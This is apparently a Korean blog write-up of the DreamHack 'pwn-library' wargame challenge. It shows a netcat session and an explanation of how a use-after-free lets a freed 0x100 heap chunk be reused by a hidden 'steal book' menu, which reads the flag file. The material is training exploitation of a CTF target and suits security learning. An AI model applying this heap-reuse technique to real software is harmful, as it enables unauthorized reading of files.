---
layout: post
subtitle: DreamHack pwn-library
comment: true
tags: [CTF, pwn]
---
# [문제](https://dreamhack.io/wargame/challenges/118/writeups)

```ts
$ nc host1.dreamhack.games 24206

[*] Welcome to library!
1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : 1
[*] Welcome to borrow book menu!
1. theori theory
2. dreamhack theory
3. einstein theory
[+] what book do you want to borrow? : 1
book create complete!
1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : 3
[*] Welcome to return book menu!
[*] lastest book returned!
1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : 275
[*] Welcome to steal book menu!
[!] caution. it is illegal!
[+] whatever, where is the book? : /home/pwnlibrary/flag.txt
[*] how many pages?(MAX 400) : 256

[*] (Siren rangs) (Siren rangs)
[*] Oops.. cops take your book..
1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : 2
[*] Welcome to read book menu!
0 : -----returned-----
[+] what book do you want to read? : 0
[*] book contents below [*]
DH{--------flag-----------}


1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : 
```


* [참고](https://linarena.github.io/linux_0x07)
UAF취약점을 이용한 문제입니다. 익스플로잇하기 전 단서들을 정리해보면
1. `steal_book`에서 `secretbook.contents`에 얼마나 메모리를 할당할지 결정할 수 있습니다.(단, 0x190 즉 400바이트 이상으로는 할당할 수 없습니다.)
2. `steal_book`에서 어떤 경로의 파일을 열 것인지 결정할 수 있습니다.
3. `burrow_book`에서는 항목 별로 힙에 할당되는 메모리 크기가 `0x100`, `0x200`, `0x300`으로 정해져 있습니다.
4. `return_book`에서는 `burrow_book`에서 할당받은 메모리를 `free`시킬 수 있습니다.
5. `contents`필드의 접근은 `read_book`함수로만 가능합니다.
<br>이를 바탕으로 시나리오를 써 보면 <br>

`read_book`을 이용해야지 `contents`를 읽을 수 있기 때문에, `secretbook.contents`가 할당받는 주소를 `return_book`이 읽을 수 있어야 합니다. 따라서 `burrow_book`을 통해 `0x100`크기의 주소를 할당받고 `return_book`을 통해 `free`시켜줍시다.
그러면 그 chunk(주소)는 `bin` double linked list에 저장되어 추후에 동일한 크기의 할당이 있을 경우 재사용됩니다. 그 후 `steal_book`을 통해 `0x100`(256바이트)크기의 영역을 할당해 `flag`를 읽으면 `bin`리스트 안의 `0x100`크기로 할당받았던 chunk가 재활용되게 됩니다.
`read_book`함수는 이전에 `free`되었던 내용이라도 똑같이 읽기 때문에 이제 플래그를 읽을 수 있습니다.